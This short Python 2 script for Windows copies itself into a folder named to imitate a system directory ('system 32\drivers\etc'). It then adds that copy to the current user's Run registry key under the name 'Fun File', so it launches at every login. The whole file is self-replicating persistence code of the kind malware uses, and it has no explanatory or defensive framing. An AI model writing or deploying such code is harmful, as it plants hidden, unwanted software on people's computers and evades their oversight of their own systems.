import os
import sys
import shutil
from _winreg import *

def addStartup(file_path):
	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

	key2change= OpenKey(HKEY_CURRENT_USER,
	keyVal,0,KEY_ALL_ACCESS)

	SetValueEx(key2change, "Fun File",0,REG_SZ, file_path)

def replicate():
	directory_name= r"C:\Windows Files\system 32\drivers\etc\files\host"
	file_path= sys.argv
	if not os.path.exists(directory_name):
		os.makedirs(directory_name)
	temp=file_path[0].split("/")
	file_name=temp[-1]
	path="\\".join(temp)
	#print name,directory_name
	shutil.copy2(path,directory_name)       #copy the file to location
	addStartup(directory_name+"\\"+file_name)       #add to startup
